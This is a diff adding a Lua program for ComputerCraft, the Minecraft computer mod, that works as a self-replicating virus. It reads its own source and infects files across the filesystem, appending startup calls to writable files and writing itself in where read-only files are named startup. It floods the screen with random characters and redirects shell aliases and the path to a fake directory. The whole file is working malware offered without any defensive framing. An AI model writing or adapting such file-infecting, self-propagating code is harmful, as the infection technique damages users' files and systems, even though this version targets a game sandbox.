@@ -1,0 +1,99 @@
+--Code initially by https://github.com/ASDFGHT0
+
+local fission = fs.open(shell.getRunningProgram(), "r")
+local fissionfragment = fission.readAll()
+fission.close()
+ 
+--local filewritev35 = fs.open("startup", "w")
+--filewritev35.write(fissionfragment)
+--filewritev35.close()
+ 
+local w, h = term.getSize()
+ 
+function disPlace()
+    shell.clearAlias("ls")
+    shell.clearAlias("dir")
+    shell.clearAlias("cp")
+    shell.clearAlias("mv")
+    shell.clearAlias("rm")
+    shell.setAlias("ls", "list")
+    shell.setAlias("dir", "dir")
+    shell.setAlias("cp", "cp")
+    shell.setAlias("mv", "move")
+    shell.setAlias("rm", "delete")
+    fake = fs.makeDir("/ ")
+    shell.setPath(fake)
+    shell.setDir(fake)
+end
+ 
+function printCentered(y, s)
+    term.setCursorPos(w / 2 - string.len(s) / 2, y)
+    write(s)
+end
+ 
+function payload()
+    local payLoadCharacters = {0, 1, ".", " ", " ", "M", "P", "G", "B"}
+    for i=1,math.huge do
+        os.queueEvent("randomEvent")
+        os.pullEventRaw()
+        term.setCursorPos(math.random(1, w), math.random(1, h))
+        local index = math.random(1, table.getn(payLoadCharacters))
+        write(payLoadCharacters[index])
+    end
+end
+
+ignoredFiles = {".temp", ".ignoreme", "apis", "openp", "disk", "shell"}
+   
+function infectDir(dirName, payload)
+  fileList = fs.list(dirName)
+  for _, file in ipairs(fileList) do
+    isIgnored = false
+    for _,ign in ipairs(ignoredFiles) do
+      if file == ign then
+        print("IGN: " .. ign)
+        print("INN: " .. file)
+        isIgnored = true
+      end
+      print(isIgnored)
+    end
+    if not isIgnored then    
+      fullFile = dirName .. "/" .. file
+      if fs.isDir(fullFile) then
+        infectDir(fullFile, payload)
+        --print("DIR: " .. fullFile)
+      elseif fs.isReadOnly(fullFile) then
+        if file ~= "startup" then
+          dump = 'shell.run("' .. fullFile .. '")\n'
+          dump = dump .. 'shell.run("/startup")'
+        else
+          dump = payload
+        end
+        
+        print(dump)
+        
+        print(file)
+        output = fs.open("/" .. file, "w")
+        output.write(dump)
+        output.close()
+     
+      elseif fullFile == "/" .. shell.getRunningProgram() then
+        --print("THS: " .. fullFile)
+   
+      else
+        output = fs.open(fullFile, "a")
+        output.write('shell.run("/startup")')
+        --print("INF: " .. fullFile)
+      end
+    end
+  end  
+end
+ 
+infectDir("", fissionfragment)
+ 
+if fs.exists("EOF") == false then
+  sleep(3)
+  payload()
+  fs.makeDir("EOF")
+end
+ 
+disPlace()
